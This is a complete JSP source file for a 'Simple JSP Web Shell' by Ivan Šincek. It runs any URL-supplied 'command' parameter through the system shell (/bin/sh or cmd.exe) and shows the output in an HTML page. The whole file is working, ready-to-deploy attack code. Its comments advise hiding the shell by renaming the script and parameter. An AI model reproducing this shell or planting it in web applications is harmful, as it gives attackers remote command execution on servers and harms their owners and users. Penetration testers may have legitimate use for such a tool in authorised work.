<%@page import="java.io.InputStream"%>
<%@page import="java.io.IOException"%>
<%@page import="java.nio.charset.StandardCharsets"%>
<%@page import="java.util.Arrays"%>

<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v4.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>
<%-- Works on Linux OS, macOS, and Windows OS. --%>

<%-- modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell --%>
<%-- you must URL encode your commands --%>

<%
    // your parameter/key here
    String parameter = "command";
    String output = "", tmp = "";
    if (("get").equalsIgnoreCase(request.getMethod()) && (tmp = request.getParameter(parameter)) != null && (tmp = tmp.trim()).length() > 0) {
        String os = System.getProperty("os.name").toUpperCase();
        String shell = null;
        if (os.contains("LINUX") || os.contains("MAC")) {
            os    = "LINUX";
            shell = "/bin/sh";
        } else if (os.contains("WIN")) {
            os    = "WINDOWS";
            shell = "cmd.exe";
        } else {
            output = "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        if (shell != null) {
            Process process = null;
            byte[] buffer = new byte[1024];
            try {
                process = new ProcessBuilder(new String[]{shell, os.equals("WINDOWS") ? "/c" : "-c", tmp}).redirectInput(ProcessBuilder.Redirect.PIPE).redirectErrorStream(true).start();
                try (
                        InputStream stdout = process.getInputStream();
                    ) {
                    int bytes;
                    do {
                        bytes = stdout.read(buffer, 0, buffer.length);
                        if (bytes > 0) {
                            output += new String(buffer, 0, bytes, StandardCharsets.UTF_8);
                        }
                    } while (bytes > 0);
                    output = output.replace("<", "&lt;");
                    output = output.replace(">", "&gt;");
                }
            } catch (IOException ex) {
                output = String.format("ERROR: %s\n", ex);
            } finally {
                if (process != null) { process.destroy(); }
                Arrays.fill(buffer, (byte) 0);
            }
        }
        // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
        // out.print("<pre>" + output + "</pre>"); output = null; System.gc();
    }
    tmp = null;
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Simple JSP Web Shell</title>
        <meta name="author" content="Ivan Šincek">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <pre><%= output %></pre>
    </body>
</html>
<% output = null; System.gc(); %>
